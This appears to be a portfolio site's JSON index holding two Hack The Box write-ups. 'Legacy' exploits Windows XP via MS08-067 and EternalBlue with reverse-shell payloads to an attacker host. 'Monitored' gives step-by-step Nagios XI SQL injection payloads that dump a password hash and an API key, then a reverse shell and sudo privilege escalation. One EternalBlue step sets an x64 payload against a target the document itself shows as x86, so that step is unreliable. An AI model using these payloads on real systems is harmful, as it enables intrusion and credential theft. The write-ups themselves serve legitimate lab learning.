
[{"content":" Machine Overview #\rLegacy is a beginner-friendly Windows machine that demonstrates the impact of unpatched systems. This machine is vulnerable to several critical SMB exploits including MS08-067 and MS17-010 (EternalBlue).\nTarget Details:\nIP Address: 10.10.10.4 Operating System: Windows XP SP3 Difficulty: Easy Points: 20 Release Date: March 2017 Initial Reconnaissance #\rPort Scanning #\rStarting with an initial Nmap scan to identify open ports and services:\nnmap -sC -sV -oN nmap/initial.txt 10.10.10.4 Results:\nStarting Nmap 7.94 ( https://nmap.org ) Nmap scan report for 10.10.10.4 Host is up (0.045s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Host script results: |_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:50:56:b9:81:18 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 | System time: 2025-07-25T18:57:39+03:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported | message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required SMB Enumeration #\rLet\u0026rsquo;s enumerate the SMB service more thoroughly:\n# Check for SMB vulnerabilities nmap --script smb-vuln* -p 445 10.10.10.4 Critical Findings:\nHost script results: | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, | Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta | allows remote attackers to execute arbitrary code via a crafted RPC request | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 Exploitation Strategy #\rThe machine is vulnerable to multiple critical SMB exploits. We have two main options:\nMS08-067 - Netapi vulnerability (older, more reliable) MS17-010 - EternalBlue exploit (newer, more famous) Method 1: MS08-067 Exploitation #\rSetting up Metasploit #\rmsfconsole use exploit/windows/smb/ms08_067_netapi set RHOSTS 10.10.10.4 set LHOST tun0 show options Payload Selection #\rset payload windows/shell_reverse_tcp set LHOST 10.10.14.15 exploit Success! We get a shell immediately:\nC:\\WINDOWS\\system32\u0026gt;whoami nt authority\\system C:\\WINDOWS\\system32\u0026gt;hostname legacy Method 2: MS17-010 (EternalBlue) #\rFor educational purposes, let\u0026rsquo;s also demonstrate the EternalBlue exploit:\n# Using Metasploit use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 10.10.10.4 set LHOST 10.10.14.15 set payload windows/x64/shell_reverse_tcp exploit Post-Exploitation #\rSystem Information #\rC:\\WINDOWS\\system32\u0026gt;systeminfo Host Name: LEGACY OS Name: Microsoft Windows XP Professional OS Version: 5.1.2600 Service Pack 3 Build 2600 System Type: X86-based PC Flag Collection #\rUser Flag #\rSince we have SYSTEM access, we can access any user\u0026rsquo;s files:\nC:\\WINDOWS\\system32\u0026gt;dir C:\\Documents and Settings\\john\\Desktop\\ Volume in drive C has no label. Directory of C:\\Documents and Settings\\john\\Desktop 16/03/2017 08:32 \u0026lt;DIR\u0026gt; . 16/03/2017 08:32 \u0026lt;DIR\u0026gt; .. 16/03/2017 08:32 32 user.txt C:\\WINDOWS\\system32\u0026gt;type \u0026#34;C:\\Documents and Settings\\john\\Desktop\\user.txt\u0026#34; e69af0e4f443de72dcb□□□□□□□□□□□□□□□□ Root Flag #\rC:\\WINDOWS\\system32\u0026gt;type \u0026#34;C:\\Documents and Settings\\Administrator\\Desktop\\root.txt\u0026#34; 993442d258b0e0ec917c□□□□□□□□□□□□□□□□ Vulnerability Analysis #\rMS08-067 Technical Details #\rThe MS08-067 vulnerability exists in the Server service\u0026rsquo;s handling of RPC requests. Here\u0026rsquo;s what makes it dangerous:\nKey Points:\nCVE ID: CVE-2008-4250 CVSS Score: 10.0 (Critical) Affected Systems: Windows 2000, XP, Server 2003, Vista Attack Vector: Network (RPC over SMB) Authentication Required: None MS17-010 (EternalBlue) Details #\rOriginally developed by the NSA and leaked by the Shadow Brokers group:\nImpact Assessment:\nWormable: Can spread automatically across networks Authentication: Not required Privilege Level: SYSTEM (highest) Notable Usage: WannaCry and NotPetya ransomware Detection and Mitigation #\rDetection Methods #\rNetwork-based detection signatures:\n# Snort rule for MS08-067 alert tcp any any -\u0026gt; any 445 (msg:\u0026#34;MS08-067 Exploit Attempt\u0026#34;; content:\u0026#34;|ff|SMB|25|\u0026#34;; offset:4; depth:5; sid:100001;) Mitigation Strategies #\rPatch Management\nApply MS08-067 security update immediately Implement automated patching policies Network Segmentation\nRestrict SMB traffic between network segments Use firewalls to block ports 139 and 445 externally SMB Configuration\nDisable SMBv1 protocol entirely Enable SMB signing where possible Monitoring\nMonitor for unusual SMB traffic patterns Log failed authentication attempts Lessons Learned #\rTechnical Takeaways #\rPatch Management is Critical\nLegacy systems without patches are extremely vulnerable Even \u0026ldquo;air-gapped\u0026rdquo; systems can be compromised via physical access Defense in Depth\nMultiple security layers could have prevented this attack Network segmentation limits blast radius Vulnerability Disclosure Timeline\nMS08-067: Patched in October 2008 MS17-010: Patched in March 2017 Both were actively exploited in the wild Real-World Implications #\rThis machine demonstrates vulnerabilities that affected millions of systems:\nWannaCry Ransomware (2017): Used MS17-010 to spread globally Conficker Worm (2008): Leveraged MS08-067 for propagation Corporate Networks: Many organizations still run unpatched legacy systems Tools and Resources #\rTools Used #\rTool Purpose Command Example Nmap Port scanning \u0026amp; vulnerability detection nmap --script smb-vuln* -p 445 target Metasploit Exploitation framework use exploit/windows/smb/ms08_067_netapi Wireshark Network traffic analysis GUI-based packet capture Additional Resources #\rMicrosoft Security Bulletin MS08-067 MS17-010 Technical Analysis MITRE ATT\u0026amp;CK - Exploit Public-Facing Application Conclusion #\rLegacy demonstrates the severe impact of unpatched systems in production environments. Both MS08-067 and MS17-010 provide immediate SYSTEM-level access, highlighting the importance of:\nTimely patch management Network segmentation Vulnerability scanning Defense in depth strategies This machine serves as an excellent introduction to SMB exploitation techniques and emphasizes why legacy systems pose significant security risks.\nFinal Stats:\nTime to Root: ~15 minutes Difficulty Rating: 2/10 Key Learning: SMB vulnerability exploitation Next Steps: Try intermediate machines like Blue or Devel Remember: These techniques should only be used in authorized testing environments like Hack The Box, personal labs, or during legitimate penetration testing engagements.\n","date":"18 July 2025","externalUrl":null,"permalink":"/writeups/blue-team-labs/defense/lab-1/","section":"Cybersecurity Writeups","summary":"","title":"HTB easy","type":"writeups"},{"content":"\rInitial Reconnaissance #\rPort Scanning #\rStarting of with an Nmap TCP scan\nsudo nmap -sC -sV -p- -T4 10.129.230.96 Results:\nRelevant ports open:\nPort 80: http port 22: ssh port 389: ldap `OpenLDAP 2.2.X - 2.3.X` Port 443: HTTP: Apache httpd 2.4.56, NagiosXI Next did a Nmap UDP Scan\nsudo nmap -sU --top-ports 100 -sV -T3 -Pn -n 10.129.230.96 Relevant ports open:\nport 161: SNMPv1 server; net-snmp SNMPv3 server (public) Port 162: net-snmp; net-snmp SNMPv3 server SNMP Enumeration #\rUsed snmp.sh a custom script that I made to facilitate SNMP enumeration:\nsnmp.sh -t 10.129.230.96 -c public --extras found these credentials but was not able to login via SSH:\nuser: svc password: XjH7VCehowpR1xZB HTTP Enumeration #\rDid not find anything interesting with Gobuster or Fuff so I went directly on the website I tried to log in with the credentials found with SNMP but it was saying that the user has been disabled or does not exist\nafter doing some googling I found this post mentioning an insecure login to the backend using ticket authentification.\nhttps://support.nagios.com/forum/viewtopic.php?t=58783\nExploitation #\rGetting the token #\rI went on burp and intercepted the login post request andkept the same username and password\nI sent the request and obtain a token:\nthen crafted an URL which includes the token, used it on my browser and succeeded to login\nhttps://nagios.monitored.htb/nagiosxi/?token=342e5b9ad2b46b9eaeb23c3c06d90b219d03214b looking at the bottom we finally obtained the version:\nNagios XI 5.11.0 by doing some researches online I found out that there is a SQL injection vulnerability affecting this version:\nhttps://rootsecdev.medium.com/notes-from-the-field-exploiting-nagios-xi-sql-injection-cve-2023-40931-9d5dd6563f8c\nError based SQL injection #\rCVE-2023-40931\nintercepted the request on Burp and saw the vulnerable parameter\nPOST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1 action=acknowledge_banner_message\u0026amp;id=2 Confirming SQLi : ?action=acknowledge_banner_message\u0026amp;id=1 AND EXTRACTVALUE(1,(SELECT VERSION())) # Output: # SQL Error [nagiosxi]: XPATH syntax error: \u0026#39;.23-MariaDB-0+deb11u1\u0026#39; Direct Schema enumeration: ?action=acknowledge_banner_message\u0026amp;id=1 AND EXTRACTVALUE(1,(SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA)) # Output: # SQL Error: Subquery returns more than 1 row Using group_concat() to Dump All Schemas ?action=acknowledge_banner_message\u0026amp;id=1 AND EXTRACTVALUE(1,(SELECT GROUP_CONCAT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA)) # Output: # SQL Error: XPATH syntax error: \u0026#39;information_schema,nagiosxi\u0026#39; Use LIMIT to Dump Schema Names One by One: ?action=acknowledge_banner_message\u0026amp;id=1 AND EXTRACTVALUE(1,concat(1, (SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))) # Output: # SQL Error: \u0026#39;information_schema\u0026#39; Repeat Full Schema Dump with clean concat: ?action=acknowledge_banner_message\u0026amp;id=1 AND EXTRACTVALUE(1,concat(1, (SELECT GROUP_CONCAT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA))) # Output: # SQL Error: \u0026#39;information_schema,nagiosxi\u0026#39; Dump Tables + Columns from the target DB: ?action=acknowledge_banner_message\u0026amp;id=1 AND EXTRACTVALUE(1,concat(1, (SELECT GROUP_CONCAT(TABLE_NAME,\u0026#34;:\u0026#34;,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = \u0026#39;nagiosxi\u0026#39;))) Loop tables with LIMIT: ?action=acknowledge_banner_message\u0026amp;id=1 AND EXTRACTVALUE(1,concat(1, (SELECT GROUP_CONCAT(TABLE_NAME,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = \u0026#39;nagiosxi\u0026#39; AND TABLE_NAME = \u0026#39;xi_users\u0026#39;))) # Output: xi_usersuser_id,xi_usersusern... Target a specific table (xi_users) ?action=acknowledge_banner_message\u0026amp;id=1 AND EXTRACTVALUE(1,concat(1, (SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = \u0026#39;nagiosxi\u0026#39; AND TABLE_NAME = \u0026#39;xi_users\u0026#39; LIMIT 0,1))) # Output: # SQL Error: \u0026#39;user_id\u0026#39; Extract Columns One-by-One from xi_users: ?action=acknowledge_banner_message\u0026amp;id=1 AND EXTRACTVALUE(1,concat(1, (SELECT username FROM xi_users LIMIT 0,1))) # Output: nagiosadmin ?action=acknowledge_banner_message\u0026amp;id=1 AND EXTRACTVALUE(1,concat(1, (SELECT username FROM xi_users LIMIT 1,1))) # Output: svc Dump Row Data from xi_users: ?action=acknowledge_banner_message\u0026amp;id=1 AND EXTRACTVALUE(1,concat(1, (SELECT password FROM xi_users LIMIT 0,1))) # Output: $2a$10$825c1eec29c150b118fe7u... ?action=acknowledge_banner_message\u0026amp;id=1 AND EXTRACTVALUE(1,concat(1, (SELECT api_key FROM xi_users LIMIT 0,1))) # Output (truncated): \u0026#39;IudGPHd9pEKiee9MkJ7ggPD89q3Yn...\u0026#39; Fix API Key Truncation using SUBSTRING(): ?action=acknowledge_banner_message\u0026amp;id=1 AND EXTRACTVALUE(1,concat(1, (SELECT SUBSTRING(api_key,1,28) FROM xi_users LIMIT 0,1))) # Part 1: IudGPHd9pEKiee9MkJ7ggPD89q3Y ?action=acknowledge_banner_message\u0026amp;id=1 AND EXTRACTVALUE(1,concat(1, (SELECT SUBSTRING(api_key,29,56) FROM xi_users LIMIT 0,1))) # Part 2: ndctnPeRQOmS2PQ7QIrbJEomFVG6 ?action=acknowledge_banner_message\u0026amp;id=1 AND EXTRACTVALUE(1,concat(1, (SELECT SUBSTRING(api_key,57,70) FROM xi_users LIMIT 0,1))) # Part 3 (safety padding): Eut9CHLL **FInal API Key:\nIudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL Creating a user #\ralso looking at this exploit from Exploit DB\nhttps://www.exploit-db.com/exploits/51925\nI was able to create an user and login without requiring the token.\nthey required me to change the password and I changed it to:\npassword1 Command Execution via Nagios Panel #\rAccessed the Command management menu in Nagios and added a bash reverse shell as a new command.\n``navigation \u0026gt; configure \u0026gt; core config manager \u0026gt; commands \u0026gt; create new command\nsave command \u0026gt; apply configuration then navigation \u0026gt; configure \u0026gt; core config manager \u0026gt; services \u0026gt; add new \u0026gt; Check Command = reverse shell\nnext we can open a Netcat listener matching the port of the command we created earlier in Nagios\nnc -lvnp 4444 next we just need to run the command in order to get a connection back to our reverse shell:\nFlag :\nPrivilege Escalation #\rI originally went in the Nagios folder to check the configuration files but did not find anything interesting there. I then ran sudo -l to see if there was something interesting that we could do.\nBased on what we see, we just need to modify the nagios binary in order to obtain a Root shell and we actually have the rights.\ncd /usr/local/nagios/bin nano nagios added a reverse shell in the file:\nchmod +x nagios Executed the command and got root:\nsudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios ","externalUrl":null,"permalink":"/writeups/red-team-ctfs/hack-the-box/monitored/","section":"Cybersecurity Writeups","summary":"","title":"Monitored","type":"writeups"},{"content":" ","date":"18 July 2025","externalUrl":null,"permalink":"/writeups/blue-team-labs/defense/","section":"Cybersecurity Writeups","summary":"","title":"defense","type":"writeups"},{"content":" ","externalUrl":null,"permalink":"/writeups/blue-team-labs/forensics/","section":"Cybersecurity Writeups","summary":"","title":"forensics","type":"writeups"},{"content":" ","externalUrl":null,"permalink":"/writeups/red-team-ctfs/","section":"Cybersecurity Writeups","summary":"Defensive cybersecurity exercises and incident response","title":"Red Team","type":"writeups"},{"content":"A collection of Writeups on the the labs I have done in both Red Team side and Blue Team side.\n","date":"18 July 2025","externalUrl":null,"permalink":"/writeups/","section":"Cybersecurity Writeups","summary":"","title":"Cybersecurity Writeups","type":"writeups"},{"content":" ","date":"18 July 2025","externalUrl":null,"permalink":"/writeups/blue-team-labs/","section":"Cybersecurity Writeups","summary":"Digital forensics, malware analysis and incident response","title":"Blue Team","type":"writeups"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/difficulties/","section":"Difficulties","summary":"","title":"Difficulties","type":"difficulties"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/difficulties/easy/","section":"Difficulties","summary":"","title":"Easy","type":"difficulties"},{"content":" Welcome to My Cybersecurity Portfolio #\rAbout Me #\rI\u0026rsquo;m a dedicated cybersecurity professional with expertise in both offensive and defensive security operations. My passion lies in understanding complex attack vectors, developing robust defense strategies, and sharing knowledge with the cybersecurity community.\n","date":"18 July 2025","externalUrl":null,"permalink":"/","section":"File Name","summary":"","title":"File Name","type":"page"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/platforms/hack-the-box/","section":"Platforms","summary":"","title":"Hack the Box","type":"platforms"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/platforms/","section":"Platforms","summary":"","title":"Platforms","type":"platforms"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/categories/red-team/","section":"Categories","summary":"","title":"Red Team","type":"categories"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/tags/smb/","section":"Tags","summary":"","title":"SMB","type":"tags"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","externalUrl":null,"permalink":"/tags/%23api/","section":"Tags","summary":"","title":"#API","type":"tags"},{"content":"","externalUrl":null,"permalink":"/tags/%23sql/","section":"Tags","summary":"","title":"#SQL","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":" ","externalUrl":null,"permalink":"/writeups/red-team-ctfs/hack-the-box/","section":"Cybersecurity Writeups","summary":"","title":"hack-the-box","type":"writeups"},{"content":"","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","externalUrl":null,"permalink":"/tags/nagios/","section":"Tags","summary":"","title":"Nagios","type":"tags"},{"content":" ","externalUrl":null,"permalink":"/writeups/red-team-ctfs/proving-grounds/","section":"Cybersecurity Writeups","summary":"","title":"proving-grounds","type":"writeups"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/techniques/","section":"Techniques","summary":"","title":"Techniques","type":"techniques"},{"content":" ","externalUrl":null,"permalink":"/writeups/red-team-ctfs/virtual-hacking-labs/","section":"Cybersecurity Writeups","summary":"","title":"Virtual Hacking labs","type":"writeups"},{"content":" ","externalUrl":null,"permalink":"/writeups/red-team-ctfs/vulnlab/","section":"Cybersecurity Writeups","summary":"","title":"vulnlab","type":"writeups"}]